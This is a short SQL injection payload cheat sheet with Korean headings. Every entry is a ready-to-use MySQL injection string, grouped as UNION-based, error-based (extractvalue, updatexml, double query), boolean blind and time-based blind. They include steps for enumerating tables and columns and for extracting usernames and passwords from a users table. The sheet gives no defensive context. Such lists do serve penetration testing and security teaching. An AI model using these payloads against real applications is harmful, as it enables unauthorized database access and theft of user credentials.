UNION-based Injection

컬럼 수 확인
' ORDER BY 1--
UNION SELECT
' UNION SELECT NULL,NULL,NULL--
테이블 목록
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
컬럼 목록
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
데이터 추출
' UNION SELECT username,password FROM users--
GROUP_CONCAT 사용
' UNION SELECT GROUP_CONCAT(username,':',password),NULL FROM users--

Error-based Injection

ExtractValue
' AND extractvalue(1,concat(0x7e,(SELECT user())))--
UpdateXML
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
Double Query
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--

Blind SQL Injection (Boolean)

참/거짓 테스트
' AND 1=1--
SUBSTRING 문자 추출
' AND SUBSTRING(database(),1,1)='a'--
ASCII 값 비교
' AND ASCII(SUBSTRING(database(),1,1))>97--

Time-based Blind

SLEEP
' AND SLEEP(5)--
조건부 SLEEP
' AND IF(1=1,SLEEP(5),0)--
BENCHMARK
' AND BENCHMARK(10000000,MD5('test'))--
